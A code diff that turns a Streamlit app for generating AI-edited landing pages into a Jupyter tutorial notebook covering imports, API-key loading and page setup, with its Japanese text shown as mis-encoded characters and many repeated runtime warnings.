-        with st.expander("âœï¸ ãƒ†ã‚­ã‚¹ãƒˆç·¨é›†ï¼ˆæœ€åˆã®H1 & ã‚µãƒ–ï¼‰", expanded=False):
-            curr_body = st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0]
-            curr_h1  = extract_first_h1(curr_body)
-            curr_sub = extract_subtext(curr_body)
-            new_h1   = st.text_input("H1", curr_h1 or site_title)
-            new_sub  = st.text_input("ã‚µãƒ–ï¼ˆ.sub / .leadï¼‰", curr_sub or tagline)
-            if st.button("â¬† ãƒ†ã‚­ã‚¹ãƒˆåæ˜ "):
-                body = curr_body
-                if curr_h1:  body = replace_first_h1(body, new_h1)
-                if curr_sub: body = replace_subtext(body, new_sub)
-                st.session_state.gen_html = st.session_state.gen_html.replace(curr_body, body)
-                st.success("ãƒ†ã‚­ã‚¹ãƒˆã‚’æ›´æ–°ã—ã¾ã—ãŸã€‚")
-
-        # ç”»åƒå·®ã—æ›¿ãˆ
-        with st.expander("ğŸ–¼ ç”»åƒå·®ã—æ›¿ãˆï¼ˆãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ï¼‰", expanded=False):
-            # å…¬å¼: st.file_uploader
-            # https://docs.streamlit.io/develop/api-reference/widgets/st.file_uploader
-            curr_body = st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0]
-            if not st.session_state.img_slots:
-                st.info("ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ï¼ˆaria-label=\"image\" ã¾ãŸã¯ class=\"img ...\"ï¼‰ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã€‚")
-            else:
-                updated = False
-                for idx, (_, ph_html) in enumerate(st.session_state.img_slots):
-                    up = st.file_uploader(f"ç”»åƒ {idx+1}", type=["png", "jpg", "jpeg", "webp"], key=f"u_{idx}")
-                    if up is not None:
-                        data_uri, _ = data_uri_from_file(up)
-                        curr_body = replace_placeholder_with_img(curr_body, ph_html, data_uri)
-                        updated = True
-                if updated:
-                    st.session_state.gen_html = st.session_state.gen_html.replace(
-                        st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0],
-                        curr_body
-                    )
-                    st.session_state.img_slots = find_image_placeholders(curr_body)
-                    st.success("ç”»åƒã‚’åæ˜ ã—ã¾ã—ãŸã€‚")
-
-        # AIå·®åˆ†ç·¨é›†
-        with st.expander("ğŸ¤– AIã«æŒ‡ç¤ºã—ã¦å†ç·¨é›†ï¼ˆå·®åˆ†é©ç”¨ï¼‰", expanded=False):
-            st.write("ä¾‹ï¼‰ã€ãƒ’ãƒ¼ãƒ­ãƒ¼ã‚’å·¦å³2ã‚«ãƒ©ãƒ ã«ã€ã€å¯æ„›ã„æ–¹å‘ã«ã€ã€è§’ä¸¸20pxã€ã€ä½™ç™½ã‚’åºƒã‚ã€ã€ãƒã‚ªãƒ³æ„Ÿå¼·ã‚ã€ãªã©")
-            ai_edit_prompt = st.text_area("AIã¸ã®æŒ‡ç¤ºï¼ˆæ—¥æœ¬èªã§OKï¼‰", height=90)
-
-            def ai_edit(css_text: str, body_html: str, instruction: str) -> Tuple[str, str]:
-                sys = "ã‚ãªãŸã¯ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰/ãƒ‡ã‚¶ã‚¤ãƒ³ã®å°‚é–€å®¶ã§ã™ã€‚å®‰å…¨ãªç´”HTML+CSSã®ã¿ã§ç·¨é›†ã—ã¾ã™ã€‚"
-                user = f"""
-ã“ã‚Œã‹ã‚‰ä¸ãˆã‚‹ 'css' ã¨ 'body_html' ã‚’ã€æŒ‡ç¤ºã«å¾“ã£ã¦**ç›´æ¥æ›¸ãæ›ãˆ**ã¦ãã ã•ã„ã€‚
-- è¿”ç­”ã¯ JSON 1å€‹ã€ã‚¹ã‚­ãƒ¼ãƒã¯ {{ "css": "...", "body_html": "..." }} ã®ã¿
-- scriptã‚¿ã‚°ãƒ»å¤–éƒ¨CDNãƒ»@import ã¯ç¦æ­¢
-- onClick ç­‰ã® on* ã¯ä½¿ã‚ãªã„
-- ç”»åƒã¯æ—¢å­˜ã®ãƒ€ãƒŸãƒ¼div/imgã‚’æ•´å½¢ï¼ˆæ–°è¦èª­ã¿è¾¼ã¿ç¦æ­¢ï¼‰
-
-[ç¾åœ¨ã®CSS]
-{css_text}
-
-[ç¾åœ¨ã®BODY]
-{body_html}
-
-[ç·¨é›†æŒ‡ç¤º]
-{instruction}
-"""
-                resp = client.chat.completions.create(
-                    model="gpt-4o-mini",
-                    temperature=0.8,
-                    response_format={"type": "json_object"},
-                    messages=[{"role": "system", "content": sys}, {"role": "user", "content": user}],
-                )
-                dat = json.loads(resp.choices[0].message.content)
-                return dat.get("css", ""), _sanitize_html(dat.get("body_html", ""))
-
-            if st.button("ğŸª„ æŒ‡ç¤ºã©ãŠã‚ŠAIã§å†ç·¨é›†ã™ã‚‹"):
-                try:
-                    curr_body = st.session_state.gen_html.split("<body>", 1)[1].rsplit("</body>", 1)[0]
-                    new_css, new_body = ai_edit(
-                        st.session_state.gen_css,
-                        curr_body,
-                        ai_edit_prompt.strip() or "å…¨ä½“ã‚’æ´—ç·´ã€‚ä½™ç™½ã¨éšå±¤ã®ã‚³ãƒ³ãƒˆãƒ©ã‚¹ãƒˆã‚’èª¿æ•´ã€‚"
-                    )
-                    if new_css:
-                        st.session_state.gen_css = new_css
-                    if new_body:
-                        st.session_state.gen_html = st.session_state.gen_html.replace(curr_body, new_body)
-                        st.session_state.img_slots = find_image_placeholders(new_body)
-                    st.success("AIå·®åˆ†ç·¨é›†ã‚’åæ˜ ã—ã¾ã—ãŸã€‚")
-                except Exception as e:
-                    st.error("AIå·®åˆ†ç·¨é›†ã«å¤±æ•—ã—ã¾ã—ãŸã€‚"); st.exception(e)
-
-        # ã‚³ãƒ¼ãƒ‰ / ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰
-        st.subheader("ğŸ§© ç”Ÿæˆã‚³ãƒ¼ãƒ‰ / ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰")
-        tabs = st.tabs(["index.html", "styles.css"])
-        with tabs[0]:
-            st.code(st.session_state.gen_html, language="html")
-            st.download_button("index.html ã‚’DL", st.session_state.gen_html.encode("utf-8"), file_name="index.html")
-        with tabs[1]:
-            st.code(st.session_state.gen_css, language="css")
-            st.download_button("styles.css ã‚’DL", st.session_state.gen_css.encode("utf-8"), file_name="styles.css")
-
-        # ZIPä¸€æ‹¬ï¼ˆdata URI ã‚’ assets/ ã«å±•é–‹ï¼‰
-        def to_zip(html: str, css: str) -> bytes:
-            buf = io.BytesIO()
-            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
-                html_out = html
-                matches = re.findall(r'src="data:[^"]+"', html_out)
-                img_index = 1
-                for m in matches:
-                    data_uri = m.split('"', 1)[1].rsplit('"', 1)[0]
-                    if ";base64," in data_uri:
-                        head, b64 = data_uri.split(";base64,", 1)
-                        if "image/png" in head: ext = "png"
-                        elif "image/webp" in head: ext = "webp"
-                        elif "image/jpeg" in head or "image/jpg" in head: ext = "jpg"
-                        else: ext = "png"
-                        data = base64.b64decode(b64)
-                        path = f"assets/img_{img_index}.{ext}"
-                        z.writestr(path, data)
-                        html_out = html_out.replace(data_uri, "./" + path, 1)
-                        img_index += 1
-                z.writestr("index.html", html_out)
-                z.writestr("styles.css", css)
-                z.writestr("script.js", "")
-            buf.seek(0); return buf.getvalue()
-
-        st.download_button(
-            "ğŸ“¦ ä¸€æ‹¬ZIPï¼ˆNetlifyç”¨ï¼‰",
-            to_zip(st.session_state.gen_html, st.session_state.gen_css),
-            file_name="lp_site_ai_editable.zip"
-        )
-else:
-    st.info("å·¦ã‚µã‚¤ãƒ‰ãƒãƒ¼ã‚’è¨­å®šã—ã¦ï¼»ğŸ¯ LPã‚’ç”Ÿæˆï¼ˆAIï¼‰ï¼½ã‚’æŠ¼ã—ã¦ãã ã•ã„ã€‚ç”Ÿæˆå¾Œã«å³å´ã§è‰²/ãƒ†ã‚­ã‚¹ãƒˆ/ç”»åƒ/AIå·®åˆ†ç·¨é›†ãŒã§ãã¾ã™ã€‚")
+{
+ "cells": [
+  {
+   "cell_type": "markdown",
+   "id": "ec6a70d9",
+   "metadata": {},
+   "source": [
+    "\n",
+    "# LPã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ãƒ¼ï¼ˆStreamlitã§LPã‚’ä½œã‚‹ï¼‰\n",
+    "\n",
+    "Streamlit å…¬å¼ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‚ç…§ã—ãªãŒã‚‰ã€å®Œæˆæ¸ˆã¿ã‚¢ãƒ—ãƒªã®ã‚³ãƒ¼ãƒ‰ã‚’1è¡Œãšã¤ç†è§£ã™ã‚‹ãŸã‚ã®æ•™æã§ã™ã€‚  \n",
+    "æœ€çµ‚æˆæœç‰©ã¯ Streamlit ã‚¢ãƒ—ãƒªï¼ˆ`app.py`ï¼‰ã§ã™ãŒã€ã“ã“ã§ã¯ è¨­è¨ˆã®æ„å›³ ãªã©ã®ãƒ­ã‚¸ãƒƒã‚¯ãƒ»æŒ™å‹•ã‚’ç¢ºèªã—ã¾ã™ã€‚\n",
+    "\n",
+    "---\n",
+    "\n",
+    "## äº‹å‰æº–å‚™ï¼ˆå®Ÿè¡Œç’°å¢ƒï¼‰\n",
+    "\n",
+    "- å¿…è¦ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ï¼š  \n",
+    "  ```bash\n",
+    "  pip install -U openai streamlit python-dotenv\n",
+    "  ```\n",
+    "- APIã‚­ãƒ¼ã®è¨­å®šï¼šãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç›´ä¸‹ã® `.env` ã«ä»¥ä¸‹ã‚’è¨˜è¼‰ï¼ˆAPI_KEYã¯ä»»æ„ã®ã‚‚ã®ã‚’å…¥åŠ›ï¼‰\n",
+    "  ```\n",
+    "  OPENAI_API_KEY=sk-xxxx\n",
+    "  ```\n",
+    "\n",
+    "> **ãƒã‚¤ãƒ³ãƒˆ**: å®Ÿéš›ã«ã‚¢ãƒ—ãƒªã‚’å‹•ã‹ã™ã®ã¯ **Streamlit** ä¸Šã§ã™ï¼ˆ`streamlit run app.py`ï¼‰ã€‚  \n",
+    "> æœ¬ãƒãƒ¼ãƒˆãƒ–ãƒƒã‚¯ã¯ã€Œèª­ã¿ãªãŒã‚‰ç†è§£ã™ã‚‹æ•™æã€ã§ã€ã‚³ãƒ¼ãƒ‰ã¯**å­¦ç¿’ã®ãŸã‚ã«åˆ†å‰²**ã•ã‚Œã¦ã„ã¾ã™ã€‚\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "cd608e8a",
+   "metadata": {},
+   "source": [
+    "\n",
+    "## ğŸ“š å…¬å¼ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆï¼ˆã‚ˆãå‚ç…§ã™ã‚‹ãƒšãƒ¼ã‚¸ï¼‰\n",
+    "\n",
+    "- ãƒšãƒ¼ã‚¸è¨­å®š: [`st.set_page_config`](https://docs.streamlit.io/develop/api-reference/configuration/st.set_page_config)\n",
+    "- è¨­å®šã¨æ§‹æˆ: [Configuration](https://docs.streamlit.io/develop/api-reference/configuration)\n",
+    "- ã‚»ãƒƒã‚·ãƒ§ãƒ³çŠ¶æ…‹: [`st.session_state`](https://docs.streamlit.io/develop/api-reference/caching-and-state/st.session_state), [Concepts](https://docs.streamlit.io/develop/concepts/architecture/session-state)\n",
+    "- ã‚«ã‚¹ã‚¿ãƒ HTMLåŸ‹ã‚è¾¼ã¿: [`components.html`](https://docs.streamlit.io/develop/api-reference/custom-components/st.components.v1.html)\n",
+    "- `st.html`ï¼ˆæŒ¿å…¥æ™‚ã®æ³¨æ„å«ã‚€ï¼‰: [`st.html`](https://docs.streamlit.io/develop/api-reference/text/st.html)\n",
+    "- ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰: [`st.file_uploader`](https://docs.streamlit.io/develop/api-reference/widgets/st.file_uploader)\n",
+    "- ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒ„ç®¡ç†: [`st.secrets`](https://docs.streamlit.io/develop/api-reference/connections/st.secrets), [Secrets Management](https://docs.streamlit.io/develop/concepts/connections/secrets-management)\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "bb9a84b4",
+   "metadata": {},
+   "source": [
+    "\n",
+    "## ã‚»ã‚¯ã‚·ãƒ§ãƒ³1ï¼šã‚¤ãƒ³ãƒãƒ¼ãƒˆ\n",
+    "\n",
+    "- æ¨™æº–ãƒ©ã‚¤ãƒ–ãƒ©ãƒªï¼ˆ`os`, `re`, `json` ãªã©ï¼‰\n",
+    "  - from __future__ import annotations â†’ å‹ãƒ’ãƒ³ãƒˆã‚’å¾Œã‹ã‚‰è©•ä¾¡ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹\n",
+    "  - from typing import Dict, List, Tuple â†’ è¾æ›¸ãƒ»ãƒªã‚¹ãƒˆãƒ»ã‚¿ãƒ—ãƒ«ãªã©ã®å‹ã‚’è¡¨ã™\n",
+    "  -  çœç•¥å¯èƒ½ã ãŒã€ã‚³ãƒ¼ãƒ‰é‡ãŒå¤šããªã‚‹ã¨ã‚¨ãƒ‡ã‚£ã‚¿ãŒè£œå®Œã‚„è­¦å‘Šã‚’ã—ã¦ãã‚Œã‚‹ã®ã§ã€æ›¸ãé–“é•ã„ã‚’æ—©ãè¦‹ã¤ã‘ã‚‰ã‚Œã‚‹ã€‚\n",
+    "- `streamlit` ã¨ `components`  \n",
+    "- `openai` SDK\n",
+    "  - from openai import RateLimitError, APIStatusError â€¦ API ã®ã‚¨ãƒ©ãƒ¼ã‚’æ•æ‰ã™ã‚‹ä¾‹å¤–ã‚¯ãƒ©ã‚¹\n",
+    "    - RateLimitError â€¦ å‘¼ã³å‡ºã—ä¸Šé™ã‚’è¶…ãˆãŸã¨ã\n",
+    "    - APIStatusError â€¦ ã‚µãƒ¼ãƒãƒ¼å´ã®ä¸å…·åˆï¼ˆHTTP 500 ãªã©ï¼‰\n",
+    "- `.env` å–ã‚Šè¾¼ã¿ã®ãŸã‚ã® `python-dotenv`\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 14,
+   "id": "04976863",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "\n",
+    "from __future__ import annotations\n",
+    "import os, io, re, json, base64, zipfile, random\n",
+    "from typing import Dict, List, Tuple\n",
+    "\n",
+    "import streamlit as st\n",
+    "import streamlit.components.v1 as components\n",
+    "\n",
+    "from openai import OpenAI\n",
+    "from openai import RateLimitError, APIStatusError\n",
+    "\n",
+    "# .env èª­ã¿è¾¼ã¿ï¼ˆç„¡ã‘ã‚Œã°ä½•ã‚‚ã—ãªã„ï¼‰\n",
+    "try:\n",
+    "    from dotenv import load_dotenv\n",
+    "    load_dotenv()\n",
+    "except Exception:\n",
+    "    pass\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "81f26d94",
+   "metadata": {},
+   "source": [
+    "\n",
+    "## ã‚»ã‚¯ã‚·ãƒ§ãƒ³2ï¼šAPIã‚­ãƒ¼å–å¾—ã®æ–¹é‡\n",
+    "\n",
+    "ã“ã®ã‚»ãƒ«ã§ã¯ã€OpenAI ã® **API ã‚­ãƒ¼ã‚’å®‰å…¨ã«å–å¾—** ã™ã‚‹æ–¹æ³•ã‚’å®šç¾©ã—ã¾ã™ã€‚\n",
+    "\n",
+    "---\n",
+    "\n",
+    "### ã‚­ãƒ¼ã‚’æ¢ã™é †åº\n",
+    "1. `os.getenv(\"OPENAI_API_KEY\")` ã‚’ç¢ºèª  \n",
+    "   â†’ `.env` ã«æ›¸ã„ãŸå€¤ã¯ `python-dotenv` ã® `load_dotenv()` ã«ã‚ˆã£ã¦ç’°å¢ƒå¤‰æ•°åŒ–ã•ã‚Œã¾ã™ã€‚\n",
+    "2. è¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã¯ã€`st.secrets` ã‚’ç¢ºèª  \n",
+    "   â†’ ã“ã“ã¯ `.streamlit/secrets.toml` ã®å†…å®¹ã‚’èª­ã¿è¾¼ã¿ã¾ã™ã€‚\n",
+    "\n",
+    "---\n",
+    "\n",
+    "### `secrets.toml` ã«ã¤ã„ã¦\n",
+    "- **ãƒ­ãƒ¼ã‚«ãƒ«å­¦ç¿’**ã§ã¯ä¸è¦ï¼ˆç’°å¢ƒå¤‰æ•° or `.env` ã ã‘ã§OKï¼‰ã€‚  \n",
+    "- **Streamlit Cloud ã«ãƒ‡ãƒ—ãƒ­ã‚¤**ã™ã‚‹å ´åˆã¯ã€ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒå¿…é ˆã§ã™ã€‚  \n",
+    "  ãƒªãƒã‚¸ãƒˆãƒªç›´ä¸‹ã« `.streamlit/secrets.toml` ã‚’ç½®ãã€  \n",
+    "  `OPENAI_API_KEY=\"sk-xxxx\"` ã®ã‚ˆã†ã«ã‚­ãƒ¼ã‚’æ›¸ãã¾ã™ã€‚\n",
+    "\n",
+    "> ãƒ•ã‚¡ã‚¤ãƒ«ãŒãªã„ç’°å¢ƒã§ã‚‚ã‚¢ãƒ—ãƒªãŒè½ã¡ãªã„ã‚ˆã†ã«ã€`try/except` ã§å®‰å…¨ã«å‚ç…§ã—ã¦ã„ã¾ã™ã€‚\n",
+    "\n",
+    "---\n",
+    "\n",
+    "ğŸ’¡ **ãƒã‚¤ãƒ³ãƒˆ**\n",
+    "- ã€Œãƒ­ãƒ¼ã‚«ãƒ« â†’ .env / ç’°å¢ƒå¤‰æ•°ã€  \n",
+    "- ã€Œã‚¯ãƒ©ã‚¦ãƒ‰ â†’ secrets.tomlã€  \n",
+    "ã¨ã„ã†2æ®µæ§‹ãˆã«ã—ã¦ã„ã¾ã™ã€‚\n",
+    "\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 15,
+   "id": "b391fd53",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "\n",
+    "def get_api_key(env_key: str = \"OPENAI_API_KEY\") -> str | None:\n",
+    "    # ç’°å¢ƒå¤‰æ•°å„ªå…ˆã§ API ã‚­ãƒ¼ã‚’å–å¾—ã€‚secrets ã¯å­˜åœ¨ã—ãªã„ç’°å¢ƒã§ã‚‚ä¾‹å¤–ã«ãªã‚‰ãªã„ã‚ˆã†ã«å‚ç…§ã€‚\n",
+    "    key = os.getenv(env_key)\n",
+    "    if key:\n",
+    "        return key\n",
+    "    try:\n",
+    "        return st.secrets[env_key]  # secrets.toml ãŒç„¡ã„å ´åˆã‚‚ã‚ã‚‹ãŸã‚ä¾‹å¤–å®‰å…¨ã«ã™ã‚‹\n",
+    "    except Exception:\n",
+    "        return None\n",
+    "\n",
+    "API_KEY = get_api_key()\n",
+    "if not API_KEY:\n",
+    "    st.error(\n",
+    "        \"OpenAI APIã‚­ãƒ¼ãŒè¦‹ã¤ã‹ã‚Šã¾ã›ã‚“ã€‚\\n\\n\"\n",
+    "        \"â–  æ¨å¥¨ï¼ˆãƒ­ãƒ¼ã‚«ãƒ«å­¦ç¿’å‘ã‘ï¼‰\\n\"\n",
+    "        \"  1) .env ã‚’ä½œæˆã— OPENAI_API_KEY=sk-xxxx ã‚’è¨˜è¼‰\\n\"\n",
+    "        \"  2) ã“ã®ã‚¢ãƒ—ãƒªã‚’å†å®Ÿè¡Œ\\n\\n\"\n",
+    "        \"â–  å‚è€ƒï¼ˆsecrets ã‚’ä½¿ã†å ´åˆï¼‰\\n\"\n",
+    "        \"  .streamlit/secrets.toml ã« OPENAI_API_KEY ã‚’è¨˜è¼‰ï¼ˆâ€»ãƒªãƒã‚¸ãƒˆãƒªã«ã‚³ãƒŸãƒƒãƒˆã—ãªã„ï¼‰\\n\"\n",
+    "        \"  å…¬å¼: st.secrets / secrets.toml ã®ä½¿ã„æ–¹ã¯ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆå‚ç…§\"\n",
+    "    )\n",
+    "    st.stop()\n",
+    "    # ãƒãƒ¼ãƒˆãƒ–ãƒƒã‚¯ä¸Šã§ã¯åœæ­¢ã—ã¾ã›ã‚“ã€‚å®Ÿã‚¢ãƒ—ãƒªã§ã¯ st.stop() ã—ã¾ã™ã€‚\n",
+    "\n",
+    "client = OpenAI(api_key=API_KEY)\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "53669566",
+   "metadata": {},
+   "source": [
+    "\n",
+    "## ã‚»ã‚¯ã‚·ãƒ§ãƒ³3ï¼šãƒšãƒ¼ã‚¸è¨­å®š & ã‚µã‚¤ãƒ‰ãƒãƒ¼ UI\n",
+    "\n",
+    "- `st.set_page_config` ã§ã‚¿ã‚¤ãƒˆãƒ«ãƒ»ã‚¢ã‚¤ã‚³ãƒ³ãƒ»ãƒ¬ã‚¤ã‚¢ã‚¦ãƒˆã‚’æŒ‡å®š\n",
+    "- ã‚µã‚¤ãƒ‰ãƒãƒ¼ã§ã¯ã€ç”Ÿæˆã«å¿…è¦ãª**å…¥åŠ›æƒ…å ±**ï¼ˆã‚¿ã‚¤ãƒˆãƒ«ã€ã‚­ãƒ£ãƒƒãƒã‚³ãƒ”ãƒ¼ãªã©ï¼‰ã‚’è¨­è¨ˆã—ã¾ã™\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 16,
+   "id": "86f1dcee",
+   "metadata": {},
+   "outputs": [
+    {
+     "name": "stderr",
+     "output_type": "stream",
+     "text": [
+      "2025-09-15 08:26:18.294 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
+     ]
+    },
+    {
+     "name": "stderr",
+     "output_type": "stream",
+     "text": [
+      "2025-09-15 08:26:18.312 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.314 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.326 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.331 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.332 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.333 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.335 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.336 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.336 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.338 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.340 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.343 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.346 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.355 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.355 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.357 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.357 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.357 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.357 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.358 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.358 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.359 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.359 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.360 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.360 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.360 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.361 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.363 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.363 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.364 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.368 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.376 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.378 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.378 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.378 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.378 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.379 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.379 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.379 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.379 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.381 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.382 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.382 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.383 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.384 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.389 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.391 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.394 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.396 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.401 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.401 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.401 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.401 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.402 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.402 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.403 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.403 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.403 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.404 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.404 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.405 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.405 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.405 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.405 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.406 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.406 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
